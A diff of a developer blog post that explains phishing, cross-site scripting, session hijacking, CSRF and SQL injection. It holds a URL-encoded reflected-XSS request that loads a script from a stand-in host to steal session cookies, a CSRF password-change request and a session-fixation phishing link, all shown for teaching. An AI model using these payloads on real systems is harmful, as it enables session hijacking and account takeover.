@@ -12,7 +12,7 @@ I can testify that a lot of people confined in me they considered doing this (in
 
 ![image-title-here](/images/my-password.jpg){:class="img-responsive"}
 
-This sort of thing happens more than you would imagine—what a lot of people don't know is that hackers rely a lot on social engineering to gain access to systems. Mitnick was famous for calling in, pretending to be somebody he wasn't and asking for somebody's password in order to "perform some maintainance".
+This sort of thing happens more than you would imagine—what a lot of people don't know is that hackers rely a lot on *social engineering* to gain access to systems. Mitnick was famous for calling in, pretending to be somebody he wasn't and asking for somebody's password in order to "perform some maintainance".
 
 ## Phishing
 If you've followed the US 2016 election cycle news, you might have heard that John Podesta was hacked. We was actually the victim of a *phising* scam whereby he received an email made to look like an email from Google (he was using Gmail) that informed him that he needed to change his password because unauthorized access to his account was detected. He fell for it, clicked on the link which redirected him to a page that looked like a Google page (he didn't pay attention to the URL it seems), and he entered his old and *supposedly* new credentials.
@@ -22,10 +22,9 @@ If you've followed the US 2016 election cycle news, you might have heard that Jo
 There are quite a lot of developers that when it comes to web application security they rely on whatever framework they are using to take care of that for them, but don't really have an understanding of what's happening behind the scenes. Web application security is quite a complex topic, we will be covering:
 
 1. Cross-site scripting, also called XSS scripting
-
 2. Session hijacking
-
-3. SQL injection
+3. Cross-site request forgery, or CSRF
+4. SQL injection
 
 Both XSS and SQL Injection are cases of *code injection*.
 
@@ -36,7 +35,7 @@ XSS refers to a vulnerabity where an attacker is able to "inject" Javascript cod
 
 A typical example of XSS is *persistent cross-site scripting*. If a page isn't properly *sanitizing* the user input (a field in a for, for example), a user could actually type in valid Javascript code, which is going to be saved by the application in its database and be subsequently rendered everytime it displays a page. Imagine you have a page that is visible to multiple users (such as a product page) which allows for users to add comments. If the page is not escaping user input, it is possible for a malicious user to write actual an script block, which will then be rendered to all users as part of the page HTML. The Javascript code has access to the cookies of that user and it can send that information to the a attacker.
 
-![image-title-here](/images/attack.gif){:class="img-responsive"}
+![image-title-here](/images/attack.png){:class="img-responsive"}
 
 An alternative is the *reflected* (or non-persistent) XSS atack, whereby the user's input is not stored in the database, but returned back in the same way it was inputed. It works like this: say you have a page that allows you to search for products. The user types some text in the search box and clicks the search button which sends a GET request to the server.
 
@@ -52,7 +51,8 @@ If the site finds something, it returns a list of results, but if it doesn't, it
 
 <pre>
 GET http://www.onlineshop.com?
-  search=%3Cscript%2520src%3D%22http%3A%2F%2Fsomesite.com%2Fscript.js%22%3E%3C%2Fscript%3E
+  search=%3Cscript%2520src%3D%22http%3A%2F%2Fsomesite.com%2Fscript.js%22%3E%3C%2Fscript%3E 
+  HTTP/1.1
 </pre>
 
 This script can then hijack the session cookie, like in the previous example.
@@ -84,6 +84,27 @@ Hey, click on http://www.website.com?sid=asb1sadasdasdan23123, and enter credit 
 </blockquote>
 
 Since the attacker knows the session id, he/she can also log to that page and see the information inputed by the user.
+
+## Cross-Site Request Forgery
+CSRF is an attack that tricks the victim into submitting a malicious request. Since the browser usually sends the session cookie with the request, the server perceivs the request as legitimate. An important part of CSRF attacks is *social engineering*. 
+
+![image-title-here](/images/csfr.png){:class="img-responsive"}
+
+Let's say a site exposes some functionality in the form of a web request, like so:
+
+<pre>
+GET https://www.thesite.com/account?password=val HTTP/1.1
+</pre>
+
+This example is a bit contrived and oversimplified, but you get the picture. If the attacker can get the user to click on a link which points to that link **while logged in**, that's going to have the effect of changing the password for the user to whatever the attacker wants. This link can be part of an email, or it can be part of a message on a public board or a website set up by the attacker etc.
+
+An action that changes the password will more likely be a POST than a GET, but that doesn't make it CSRF-proof either, because a user can be tricked into submiting a form. Here's how that would work: you could have a form with a hidden input like so:
+
+<script src="https://gist.github.com/toaderflorin/6862d6a60d2dc4418a38fd81ae69e5bd.js"></script>
+
+Using HTML forms with email is not really possible, because a lot of clients disable them or warn about them, but you could redirect the user to a page hosted somewhere. It turns out you don't even have to trick him/her to click on the submit button, that can be done by the site using Javascript (say by reacting to the document load event).
+
+How about PUT and DELETE? Turns out that the *same-origin policy* helps us here, because attackers cannot do XHR requests from their site to the *http://www.thesite.com*. It's also why for POST attacks a form is being used instead of an POST XHR. SOP blocks that too.
 
 ## SQL Injection
 And last (in our article), but certainly not least, we have SQL injection. I think most of us remember this:
